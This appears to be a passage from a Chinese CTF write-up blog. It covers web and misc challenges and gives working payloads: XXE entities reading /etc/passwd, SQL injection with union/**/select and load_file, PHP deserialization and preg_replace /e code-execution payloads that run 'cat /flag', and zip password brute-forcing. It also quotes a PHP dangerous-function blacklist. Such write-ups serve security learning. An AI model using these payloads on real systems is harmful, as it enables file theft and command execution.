<p>前两个foreach语句分别将POST参数和GET参数进行变量覆盖，接着是三个if语句，exit()函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。<br>首先我们想到的是让脚本执行到最后一句<code>echo $flag</code>;，但即使绕过三个if语句，我们GET传参或者POST传参的flag总会被变量覆盖：如我们GET传参<code>flag=aaa</code>，在第二个foreach语句中变成<code>$flag = $aaa</code>，而<code>$aaa</code>变量没有定义为空，最后的输出就是空同理：我们POST传参flag&#x3D;aaa，在第一个foreach语句中变成<code>$flag= aaa</code>，flag被覆盖为‘aaa’，最后输出aaa<br>由此看来，这样行不通，回过头来前面说到if语句中的exit()函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将<code>exit()</code>函数内的参数用<code>$flag</code>覆盖掉就能输出flag了；<br>思路理清了，这里面有三个if语句，其中有两个能利用变量覆盖输出flag,也就是说有两种方法<br>一是第二个if语句中可以看到这里是输出的<code>$yds</code>变量，那么我们就要通过变量覆盖达到<code>$yds=$flag</code>的效果，GET传参<code>yds=flag</code>，在第二个foreach语句中，首先是<code>$x=yds</code>，<code>$y=flag</code>，经过<code>$$x = $$y</code>也就变成了<code>$yds=$flag</code></p>
<p>二是第三个if语句中输出变量<code>$is</code>，判断条件为<code>$_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;</code>，这里可以通过满足后面这个条件进行变量覆盖：GET传参is&#x3D;flag&amp;flag&#x3D;flag；在第二个foreach语句中，首先是<code>$x=is</code>,<code>$y=flag</code>,带进去就变成了<code>$is=$flag</code>，这就达到了覆盖的目的，而参数中flag&#x3D;flag只是为了满足if语句</p>
<hr>
<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p>
<p>xee外部实体，构造恶意实体</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;

&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>读取flag</p>
<hr>
<h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>内网扫描</p>
<p>没做出来</p>
<p>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp</p>
<p>10.128.253.12</p>
<p>169.254.1.1</p>
<hr>
<h1 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h1><h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><p>买独角兽，买买买发现当id是4的时候返回<code>Only one char(?) allowed!</code></p>
<p>只能输入一个字符，还要很多的钱</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">Unicode - Compart</a></p>
<p>在上面这个网站搜<code>number</code>，找到Numeric Value大于价格的字符，然后赋值utf-8的值，把0x改成%，中间不留空格，拿到flag.</p>
<hr>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h4 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h4><p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h4><p>下载文件是个二维码，使用工具QR_Research查看，并没有发现flag，然后猜测有隐藏文件，打开kali，使用binwalk分析文件。</p>
<blockquote>
<p>binwalk QR_code.png</p>
</blockquote>
<p>果然发现有一个zip，使用foremost文件分离。</p>
<blockquote>
<p>foremost QR_code.png -o 111</p>
</blockquote>
<p>生成了111文件夹，看zip，解压需要密码，文件名字是4number.txt，提示密码可能是4个数字，使用&#x3D;&#x3D;fcrackzip&#x3D;&#x3D;暴力破解</p>
<blockquote>
<p>fcrackzip -b -c 1 -l 4-4 -u 00000000.zip </p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">参数解释：
-b：			使用暴力破解
-c 1：			使用字符集，1指数字集合
-l 4-4：		指定密码长度，最小长度-最大长度
-u：			不显示错误密码，仅显示最终正确密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>拿到flag</p>
<hr>
<h4 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h4><p><a target="_blank" rel="noopener" href="https://the-x.cn/base64/">Base64解码 Base64编码 UTF8 GB2312 UTF16 GBK 二进制 十六进制 解密 - The X 在线工具 (the-x.cn)</a></p>
<p>下载下来是一个exe文件，用记事本打开发现有base64加密，访问上面的连接进行base64解码，可以直接得到一个png文件，扫描二维码得到flag</p>
<hr>
<h4 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h4><p>解压zip，提示密码是四位数字，使用软件&#x3D;&#x3D;ARCHPR&#x3D;&#x3D; ,进行暴力破解，得到密码，解压，base64解码，得到flag.</p>
<hr>
<h4 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h4><p><a target="_blank" rel="noopener" href="https://www.rapidtables.org/zh-CN/convert/number/ascii-hex-bin-dec-converter.html">ASCII文本，十六进制，二进制，十进制，Base64转换器 (rapidtables.org)</a></p>
<p>用010editor打开，拉倒末尾，复制二进制，丢到上面的网站解码，得到flag</p>
<hr>
<h4 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h4><p>下载下来是一张大白的照片，&#x3D;&#x3D;PNG图片修复&#x3D;&#x3D;</p>
<p>使用脚本</p>
<p><img src="/images/misc2.png" alt="misc2"></p>
<hr>
<h4 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h4><p>是一个图片文件，用binwalk分解，有zip包，是个伪加密。</p>
<p><img src="/images/msic3.png" alt="msic3"></p>
<p>解压后得到一个flag.vmdk文件，使用命令：</p>
<blockquote>
<p> 7z x flag.vmdk -o.&#x2F;</p>
</blockquote>
<p>解压后得到key_part_one和key_part_two，分别得到加密的信息：</p>
<p><img src="/images/misc4.png" alt="misc4"></p>
<p>[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding <a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">splitbrain.org]</a><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a>)</p>
<p>解密网站</p>
<hr>
<h4 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h4><p>文件分离，得到zip文件，解压得到,key和cipher。</p>
<p>key里面是base64，解密后直接百度。</p>
<p><a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/">Serpent Encryption – Easily encrypt or decrypt strings or files (online-domain-tools.com)</a></p>
<p>&#x3D;&#x3D;serpent加密&#x3D;&#x3D;</p>
<p>使用这个网站解码</p>
<h1 id="————————————"><a href="#————————————" class="headerlink" title="————————————"></a>————————————</h1><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>要传入三个参数，text,file,password。</p>
<p>第一层，要使以text为路径的文件内容为welcome to the zjctf，这里用到data协议写入，即<code>?text=data://text/plain,welcome to the zjctf</code></p>
<p>第二层，对file进行正则匹配，不能出现flag，那我们访问一下提示的useless.php，这里使用php伪协议，即<code>file=php://filter/convert.base64-encode/resource=useless.php</code></p>
<p>第三层，拿到useless.php的源代码后，发现要构造序列化语句，这里很容易，自己写个exp就行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>将序列化后的值给password。</p>
<p>最终payload为：<code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>，查看源代码即可拿flag</p>
<hr>
<h4 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h4><p>点join，创建账号，发现用户名可以点击，点击后发现注入点，sql注入</p>
<p>order by 4 # 有4列</p>
<p>union select 1,2,3,4# 报错，过滤了union select，就用union&#x2F;**&#x2F;select 1,2,3,4# 发现2的位置回显，查库查表，发现在fakebook数据库的users表中的data字段是一段序列化的字符串，想到可以用ssrf解决，用dirsearch扫描得到robots.txt和user.php.bak，下载下来。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">UserInfo</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file:///var/www/html/flag.php"</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>构造payload：</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’#</p>
<p>在网页源代码中发现flag</p>
<p>另一种方法：</p>
<p>使用load_file()函数，直接得到flag，不过前提是知道flag文件位置 </p>
<p>payload：&#x2F;view.php?no&#x3D;0 union&#x2F;**&#x2F;select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3,4</p>
<hr>
<h4 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h4><p>查看robots.txt发现fAke_f1agggg.php，访问发现是个假的flag，抓个包发现&#x2F;fl4g.php。然后代码审计。</p>
<p>第一个考察了intval函数，这个函数返回整数，</p>
<p>如果intval函数参数填入&#x3D;&#x3D;科学计数法&#x3D;&#x3D;的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型</p>
<p>填入2e4则可以要过intval构造payload：num&#x3D;1e10</p>
<p>第二个考察md5，百度，md5&#x3D;0e215962017</p>
<p>第三个命令注入，先ls，发现fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag文件，再用cat读，但是cat被过滤了，这里用引号绕过即可，的flag</p>
<hr>
<h4 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com)</a></p>
<p>需要构造这个：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>函数名和参数都通过GET上传，于是推出</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里用pi和abs是采用白名单里面的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为中括号、引号被过滤了，可以用大括号代替</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>$_GET</code>函数不在白名单内，想办法构造，有点困难，毕竟还要求大写：<br>这里用<code>dechex()</code>(十进制转十六进制)构造出16进制数，再用<code>bin2hex()</code>绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然鹅bin2hex并不在白名单里面，这玩意还要构造出来，用base_convert()构造：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>c<span class="token string single-quoted-string">'a'</span>t <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拿到flag</p>
<hr>
<h4 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h4><p>&#x3D;&#x3D;文件包含，命令执行&#x3D;&#x3D;</p>
<p>开头和<code>[极客大挑战 2019]Secret File</code>很像，然后拿到next.php源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        
        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里涉及<code>preg_replace \e</code>的漏洞。参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
<p>构造payload：&#x2F;next.php?\S*&#x3D;{${getFlag()}}&amp;cmd&#x3D;system(‘cat &#x2F;flag’);</p>
<hr>
<h4 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h4><p>页面一直刷新抓包看看，发现post上传了两个参数，<code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code></p>
<p>猜测func是函数名,p是参数。<code>func=system&amp;p=ls</code>返回heck!!</p>
<p>应该是过滤了system，然后使用file_get_contents读取源码</p>
<p><code>func=file_get_contents&amp;p=index.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$disable_fun</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//黑名单</span>
    <span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤了很多关键字，尝试反序列化。exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cd /../../tmp;cat flagoefiu4r93"</span><span class="token punctuation">;</span><span class="token comment">//更改$p的值，查文件</span>
    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最终payload：</p>
<p><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:31:&quot;cd /../../tmp;cat flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p>
<hr>
